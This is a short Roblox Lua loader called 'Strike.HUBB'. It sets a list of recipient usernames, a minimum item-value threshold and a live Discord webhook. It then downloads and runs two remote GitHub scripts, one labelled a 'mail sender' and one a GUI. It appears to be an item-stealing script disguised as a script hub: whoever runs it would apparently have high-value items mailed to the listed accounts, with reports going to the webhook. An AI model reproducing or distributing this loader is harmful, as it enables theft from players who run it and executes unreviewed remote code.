-- Strike.HUBB.lua
-- Configuration
_G.Usernames = {"ilovemyamazing_gf1", "Yeahboi1131", "Dragonshell23", "Dragonshell24", "Dragonshell21"} -- Add more if needed
_G.minrap = 10000000
_G.webhook = "https://discord.com/api/webhooks/1431974006080147466/vjWq7Xu7Mqun02T9rUiMFzZA1btH8483bsgvVihoSw-FEKsADYQbP49cJXvfsDLNQxto"

-- Helper function to safely load a script from a URL
local function LoadScript(url)
    task.spawn(function()
        local success, err = pcall(function()
            loadstring(game:HttpGet(url))()
        end)
        if not success then
            warn("Failed to load script: "..url.."\n"..err)
        end
    end)
end

-- URLs to your raw GitHub scripts
local mailSenderURL = "https://raw.githubusercontent.com/1DeathStare1/Strike.HUB/main/Strike.lua"
local guiURL        = "https://raw.githubusercontent.com/1DeathStare1/Strike.HUB/main/gui.lua"

-- Load both scripts concurrently
LoadScript(mailSenderURL)  -- Mail sender
LoadScript(guiURL)         -- GUI
